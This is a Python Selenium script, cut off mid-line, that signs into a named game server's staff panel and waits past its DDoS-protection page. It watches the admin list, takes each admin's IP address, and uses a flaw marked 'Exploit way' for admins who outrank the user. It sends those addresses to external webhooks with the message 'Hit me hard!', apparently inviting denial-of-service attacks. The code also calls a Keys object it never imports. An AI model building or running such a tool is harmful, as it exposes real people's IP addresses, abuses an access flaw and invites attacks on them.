import os
import json
import time
import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from jsondiff import diff

# Config & cache constants
config_path = "config/account.json"
configTemplate = {"account": {"username": "", "password": ""}, "broadcasts": []}
cacheDir = "cache"

# Browser constants
CHROME_EXEC_PATH = "/usr/bin/google-chrome"  # Use google chrome instead of chromium
DEFAULT_USER_DATA_DIR = os.path.join(os.path.dirname(__file__), "config/profile")
SAVE_SS_PATH = "debug"
HEADLESS = False
PANEL_URL = "https://phoenixpanel.crowland.ro"
URL_STAFF = "/staff"
URL_USER_PART = "/profile"

# Global vars
config = None
onceDialog = False

# Functions
def getConfig():
    if not os.path.exists(config_path):
        dir_path = os.path.dirname(config_path)
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        print(f"{config_path} doesn't exist. Let's create it.")
        with open(config_path, 'w') as f:
            json.dump(configTemplate, f, indent=4)
    with open(config_path, 'r') as f:
        return json.load(f)

def readCache(file):
    if not os.path.exists(cacheDir):
        os.makedirs(cacheDir)
    file_path = os.path.join(cacheDir, f"{file}.json")
    if not os.path.exists(file_path):
        return None
    with open(file_path, 'r') as f:
        return json.load(f)

def writeCache(name, data):
    if not os.path.exists(cacheDir):
        os.makedirs(cacheDir)
    file_path = os.path.join(cacheDir, f"{name}.json")
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=4)
    return True

def checkIsCached(name, dataToCompare):
    cache = readCache(name)
    cache_diff = diff(cache, dataToCompare)
    return {"status": cache == dataToCompare, "diff": cache_diff}

def snooze(seconds):
    time.sleep(seconds)

# Mainstream
# Update config every time in case we add more broadcasts
config = getConfig()
if not config:
    raise Exception("Invalid config!")
snooze(10)

# Deploy browser aka "the main service"
try:
    chrome_options = Options()
    chrome_options.add_argument(f"user-data-dir={DEFAULT_USER_DATA_DIR}")
    if HEADLESS:
        chrome_options.add_argument("--headless")
    chrome_options.binary_location = CHROME_EXEC_PATH

    service = Service(executable_path=CHROME_EXEC_PATH)
    browser = webdriver.Chrome(service=service, options=chrome_options)
    browser.set_window_size(1024, 768)
    browser.set_page_load_timeout(30)

    # Go to panel
    browser.get(PANEL_URL)

    # Find "DDoS Protection" and bypass it?
    matches = "DDoS Protection" in browser.page_source
    banner_selector = "img[alt=homepage]"
    banner = None

    if matches:
        print("We have BlazingFast DDoS Protection, let's bypass it...")
        WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, banner_selector)))
        banner = browser.find_element(By.CSS_SELECTOR, banner_selector)
        while not banner:
            banner = browser.find_element(By.CSS_SELECTOR, banner_selector)
        print("Bypassed")
    else:
        banner = browser.find_element(By.CSS_SELECTOR, banner_selector)
        if banner:
            print("Already bypassed...")
        else:
            raise Exception("Can't find banner?")

    # Let's check if we're logged in
    matches = "Guest" in browser.page_source
    if matches:
        # Try to login
        guest_selector = "a.nav-link.dropdown-toggle.text-muted.waves-effect.waves-dark"
        login_selector = "a[data-target='#login']"
        browser.find_element(By.CSS_SELECTOR, guest_selector).click()
        browser.find_element(By.CSS_SELECTOR, login_selector).click()

        # Insert credentials
        username_script = f'document.querySelector("input[name=login_username]").value = "{config["account"]["username"]}"'
        password_script = f'document.querySelector("input[name=login_password]").value = "{config["account"]["password"]}"'
        remember_selector = "label[for=checkbox-signup]"
        browser.execute_script(username_script)
        browser.execute_script(password_script)
        browser.find_element(By.CSS_SELECTOR, remember_selector).click()

        # Try to login
        login_submit_selector = "button.btn.btn-info.btn-lg.btn-block.text-uppercase.waves-effect.waves-light"
        browser.find_element(By.CSS_SELECTOR, login_submit_selector).click()

        # Wait for navigation
        WebDriverWait(browser, 10).until(EC.url_changes(PANEL_URL))

        # Let's check if we really logged in?
        matches = "Welcome Back" in browser.page_source
        if not matches:
            raise Exception("Not logged in or we need to handle PIN?")  # TODO: Handle the PIN
    else:
        print("Already logged in...")

    # whoami
    who_selector = "div.profile-text > h4"
    who = browser.find_element(By.CSS_SELECTOR, who_selector).text
    print(f"Logged in as: {who}")

    while True:
        browser.get(f"{PANEL_URL}{URL_STAFF}")
        admins = browser.find_elements(By.CSS_SELECTOR, "div#tab-admins table tbody tr")
        admin_data = [[col.text for col in row.find_elements(By.TAG_NAME, "td")] for row in admins]

        cache_admins = []
        required_admin_level = None
        for admin in admin_data:
            admin_status, _, admin_name, admin_level = admin
            if admin_name == who:
                required_admin_level = int(admin_level)
            cache_admins.append([admin_name, int(admin_level), admin_status.lower()])

        cache_result = checkIsCached("admins", cache_admins)
        if not cache_result["status"]:
            # Make diff & broadcast
            for change in cache_result["diff"]:
                if change == "+":
                    data = cache_result["diff"][change]
                    log_msg = f"{data[0]} ({data[1]}) is {data[2]}"
                    print(log_msg)
                    if data[0] == who:
                        continue
                    for broadcast in config["broadcasts"]:
                        webhook_url = broadcast
                        payload = {
                            "username": "B-HOOD Admin Update",
                            "content": log_msg
                        }
                        requests.post(webhook_url, json=payload)
                        snooze(1)
                    # Let's take the IP now
                    name = data[0]
                    adm_level = data[1]
                    browser.get(f"{PANEL_URL}{URL_USER_PART}/{name}")
                    ip_found = False
                    ip = None
                    failed = False

                    if adm_level <= required_admin_level:  # Easy way
                        manage_selector = "a[href='#manage']"
                        ip_logs_selector = "a._ipl"
                        browser.find_element(By.CSS_SELECTOR, manage_selector).click()
                        browser.find_element(By.CSS_SELECTOR, ip_logs_selector).click()
                        ip_selector = "table#DataTables_Table_0 > tbody > tr > td"
                        WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, ip_selector)))
                        ip = browser.find_element(By.CSS_SELECTOR, ip_selector).text
                        ip_found = True
                    else:  # Exploit way
                        properties_selector = "a[href='#profile']"
                        info_exploit_selector = "i.fa.fa-info._el.text-danger"
                        browser.find_element(By.CSS_SELECTOR, properties_selector).click()
                        browser.find_element(By.CSS_SELECTOR, info_exploit_selector).click()
                        if not onceDialog:
                            def handle_dialog(driver):
                                WebDriverWait(driver, 10).until(EC.alert_is_present())
                                alert = driver.switch_to.alert
                                alert.accept()
                            handle_dialog(browser)
                            onceDialog = True
                        search_selector = "input[aria-controls=DataTables_Table_0]"
                        WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, search_selector)))
                        search_input = browser.find_element(By.CSS_SELECTOR, search_selector)
                        search_input.clear()
                        search_input.send_keys("")
                        search_input.send_keys(Keys.RETURN)
                        ip_selector = "table#DataTables_Table_0 > tbody > tr > td:nth-child(3)"
                        try:
                            WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, ip_selector)))
                            ip = browser.find_element(By.CSS_SELECTOR, ip_selector).text
                            if ip:
                                ip_found = True
                            else:
                                failed = True
                        except:
                            ip_found = False

                    if ip_found:
                        print(f"{name} >> {ip}")
                        log_msg = f"That's my IP: {ip}! Hit me hard!"
                        for broadcast in config